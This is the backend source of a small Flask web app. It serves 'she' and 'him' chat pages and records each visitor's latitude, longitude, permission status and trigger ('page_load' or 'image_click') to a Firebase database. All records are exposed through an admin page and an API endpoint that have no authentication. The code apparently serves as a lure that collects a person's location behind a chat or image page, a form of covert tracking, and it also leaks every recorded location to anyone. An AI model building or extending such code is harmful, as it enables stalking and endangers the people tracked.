from flask import Flask, render_template, request, jsonify
import requests
import time

app = Flask(__name__)

FIREBASE_DB = "https://image4u0311-default-rtdb.firebaseio.com/"

def save_to_firebase(path, data):
    url = f"{FIREBASE_DB}/{path}.json"
    requests.post(url, json=data)

@app.route("/")
def home():
    return "Server running"

@app.route("/she")
def she():
    room = request.args.get("room")
    return render_template("chat.html", role="she", room=room)

@app.route("/him")
def him():
    room = request.args.get("room")
    return render_template("chat.html", role="him", room=room)

@app.route("/admin")
def admin():
    return render_template("admin.html")

@app.route("/api/location", methods=["POST"])
def location():
    data = request.json
    payload = {
        "room": data.get("room"),
        "role": data.get("role"),
        "lat": data.get("lat"),
        "lng": data.get("lng"),
        "status": data.get("status"),  # ALLOWED / DENIED
        "action": data.get("action"),  # page_load / image_click
        "time": int(time.time())
    }
    save_to_firebase("locations", payload)
    return jsonify({"ok": True})

@app.route("/api/admin-data")
def admin_data():
    url = f"{FIREBASE_DB}/locations.json"
    r = requests.get(url)
    return jsonify(r.json())

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)